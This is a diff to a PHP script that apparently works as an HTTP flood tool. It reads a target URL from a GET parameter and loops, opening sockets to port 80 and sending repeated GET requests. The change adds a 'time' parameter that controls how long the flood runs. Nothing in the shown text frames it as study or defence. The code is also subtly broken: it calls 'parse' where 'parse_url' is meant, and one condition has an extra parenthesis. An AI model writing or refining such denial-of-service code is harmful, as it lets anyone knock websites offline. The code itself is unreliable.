@@ -1,4 +1,5 @@
 echo 'running';
+$secondsToRun = $_GET['time'];
 $url = $_GET['url'];
 $parsed_url = parse($url);
 $host = $parsed_url['host'];
@@ -6,9 +7,16 @@ $path = $parsed_url['path'];
 
 if ($path == "")
         $path = "/";
-      
+
+$timeNow = strtotime('now');
+$timeToStop = $timeNow + $secondsToRun;
+
 while(1)
 {
+        $timeNow = strtotime('now');
+        if ($timeNow >= $timeToStop))
+                break;
+                
         $sock = fsockopen($host, 80);
         $pack = "GET $path HTTP/1.1\r\n";
         $pack.= "Host: " .$host. "\r\n";
